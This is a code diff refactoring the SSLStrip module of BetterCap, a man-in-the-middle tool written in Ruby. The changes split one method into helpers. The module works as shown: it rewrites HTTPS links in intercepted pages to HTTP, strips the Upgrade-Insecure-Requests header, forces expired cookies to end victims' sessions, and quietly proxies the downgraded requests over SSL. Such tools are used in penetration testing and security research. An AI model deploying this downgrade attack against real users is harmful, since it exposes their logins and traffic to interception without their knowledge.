@@ -19,7 +19,7 @@ class Strip
   # Maximum number of redirects to detect a HTTPS redirect loop.
   MAX_REDIRECTS = 3
   # Regular expression used to parse HTTPS urls.
-  HTTPS_URL_RE = /(https:\/\/[^"'\/]+)/i
+  HTTPS_URL_RE  = /(https:\/\/[^"'\/]+)/i
 
   # Create an instance of this object.
   def initialize
@@ -31,22 +31,12 @@ class Strip
   # cookies cleaning.
   # Return a response object or nil if the request must be performed.
   def preprocess( request )
-    # check for cookies.
-    unless @cookies.is_clean?(request)
-      Logger.info "[#{'SSLSTRIP'.green} #{request.client}] Sending expired cookies for '#{request.host}'."
-      expired = @cookies.get_expired_headers!(request)
-
-      return build_expired_cookies( expired, request )
+    process_headers!(request)
+    response = process_cookies!(request)
+    if response.nil?
+      process_stripped!(request)
     end
-
-    # check for stripped urls.
-    link = @urls.normalize( request.host )
-    if request.port == 80 and @urls.was_stripped?( request.client, link )
-      Logger.debug "[#{'SSLSTRIP'.green} #{request.client}] Found stripped HTTPS link '#{link}', proxying via SSL."
-      request.port = 443
-    end
-
-    nil
+    response
   end
 
   # Process the +request+ and if it's a redirect to a HTTPS url patch the
@@ -54,6 +44,57 @@ class Strip
   # Process the +response+ and replace every https link in its body with
   # http counterparts.
   def process( request, response )
+    # check for a redirect
+    if process_redirection!( request, response )
+      # retry the request
+      return true
+    end
+
+    process_body!( request, response )
+
+    # do not retry the request.
+    false
+  end
+
+  private
+
+  # Clean some headers from +request+.
+  def process_headers!(request)
+    request['Accept-Encoding']           = nil
+    request['If-None-Match']             = nil
+    request['If-Modified-Since']         = nil
+    request['Upgrade-Insecure-Requests'] = nil
+    request['Pragma']                    = 'no-cache'
+  end
+
+  # If +request+ has unknown session cookies, create a client redirection
+  # to make them expire.
+  def process_cookies!(request)
+    response = nil
+    # check for cookies.
+    unless @cookies.is_clean?(request)
+      Logger.info "[#{'SSLSTRIP'.green} #{request.client}] Sending expired cookies for '#{request.host}'."
+      expired = @cookies.get_expired_headers!(request)
+
+      response = build_expired_cookies( expired, request )
+    end
+    response
+  end
+
+  # If the +request+ is a result of a sslstripping operation,
+  # proxy it via SSL.
+  def process_stripped!(request)
+    # check for stripped urls.
+    link = @urls.normalize( request.host )
+    if request.port == 80 and @urls.was_stripped?( request.client, link )
+      Logger.debug "[#{'SSLSTRIP'.green} #{request.client}] Found stripped HTTPS link '#{link}', proxying via SSL."
+      request.port = 443
+    end
+  end
+
+  # If the +response+ is a redirect to a HTTPS location, patch the +response+ and
+  # retry the +request+ via SSL.
+  def process_redirection!(request,response)
     # check for a redirect
     if response['Location'].start_with?('https://')
       link = @urls.normalize( response['Location'] )
@@ -68,7 +109,11 @@ class Strip
       # retry the request if possible
       return true
     end
+    false
+  end
 
+  # Process the +response+ body and strip out every HTTPS link.
+  def process_body!(request, response)
     # parse body
     links = []
     response.body.scan( HTTPS_URL_RE ).uniq.each do |link|
@@ -89,12 +134,7 @@ class Strip
         response.body.gsub!( link, downgraded )
       end
     end
-
-    # do not retry the request.
-    false
   end
-
-  private
 
   # Return a 302 Redirect BetterCap::Proxy::Response object for the
   # +request+, using +expired+ cookie headers to kill a client session.
